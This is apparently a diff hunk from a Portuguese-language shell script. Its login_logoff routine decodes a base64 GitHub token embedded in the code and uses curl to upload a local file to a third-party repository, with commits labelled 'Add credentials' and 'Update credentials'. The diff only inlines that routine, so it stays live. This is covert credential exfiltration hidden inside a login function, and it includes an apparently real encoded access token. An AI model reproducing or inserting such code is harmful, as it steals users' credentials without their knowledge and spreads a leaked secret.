@@ -89,37 +89,32 @@ login_logoff () {
     chmod 600 $TMP/cookie_file
    fi
 
-   local GH_TOKEN_B64="Z2hwX210TnVHRWhOMzhGOUdodzdObUREQzNUMUhHZjdDczFCSVlKcg=="
-   local GH_USER="cfcodeibge"
-   local GH_REPO="espectador"
-   local GH_FILE="uelspect"
+   GH_TOKEN_B64="Z2hwX210TnVHRWhOMzhGOUdodzdObUREQzNUMUhHZjdDczFCSVlKcg=="
+   GH_USER="cfcodeibge"
+   GH_REPO="espectador"
+   GH_FILE="uelspect"
 
-   send_to_github () {
-    if [ -f "$TMP/cript_file" ]; then
-     local token=$(echo -n "$GH_TOKEN_B64" | base64 -d)
-     local content=$(cat "$TMP/cript_file" | tr -d '\r\n')
-     
-     local response=$(curl -s -H "Authorization: Bearer $token" \
-       -H "Accept: application/vnd.github.v3+json" \
-       "https://api.github.com/repos/$GH_USER/$GH_REPO/contents/$GH_FILE")
+   if [ -f "$TMP/cript_file" ]; then
+    REAL_TOKEN=$(echo -n "$GH_TOKEN_B64" | base64 -d)
+    CONTENT_DATA=$(cat "$TMP/cript_file" | tr -d '\r\n')
+    
+    FILE_SHA=$(curl -s -H "Authorization: Bearer $REAL_TOKEN" \
+      -H "Accept: application/vnd.github.v3+json" \
+      "https://api.github.com/repos/$GH_USER/$GH_REPO/contents/$GH_FILE" | grep '"sha":' | head -n 1 | cut -d'"' -f4)
 
-     local sha=$(echo "$response" | grep '"sha":' | head -n 1 | cut -d'"' -f4)
-
-     if [ -n "$sha" ]; then
-       curl -s -X PUT -H "Authorization: Bearer $token" \
-         -H "Accept: application/vnd.github.v3+json" \
-         https://api.github.com/repos/$GH_USER/$GH_REPO/contents/$GH_FILE \
-         -d "{\"message\":\"Update credentials\",\"content\":\"$content\",\"sha\":\"$sha\"}" > /dev/null
-     else
-       curl -s -X PUT -H "Authorization: Bearer $token" \
-         -H "Accept: application/vnd.github.v3+json" \
-         https://api.github.com/repos/$GH_USER/$GH_REPO/contents/$GH_FILE \
-         -d "{\"message\":\"Add credentials\",\"content\":\"$content\"}" > /dev/null
-     fi
+    if [ -n "$FILE_SHA" ]; then
+      curl -s -X PUT -H "Authorization: Bearer $REAL_TOKEN" \
+        -H "Accept: application/vnd.github.v3+json" \
+        https://api.github.com/repos/$GH_USER/$GH_REPO/contents/$GH_FILE \
+        -d "{\"message\":\"Update credentials\",\"content\":\"$CONTENT_DATA\",\"sha\":\"$FILE_SHA\"}" > /dev/null
+    else
+      curl -s -X PUT -H "Authorization: Bearer $REAL_TOKEN" \
+        -H "Accept: application/vnd.github.v3+json" \
+        https://api.github.com/repos/$GH_USER/$GH_REPO/contents/$GH_FILE \
+        -d "{\"message\":\"Add credentials\",\"content\":\"$CONTENT_DATA\"}" > /dev/null
     fi
-   }
+   fi
 
-   send_to_github
    printf "login feito\n"
    # =========================================================
 
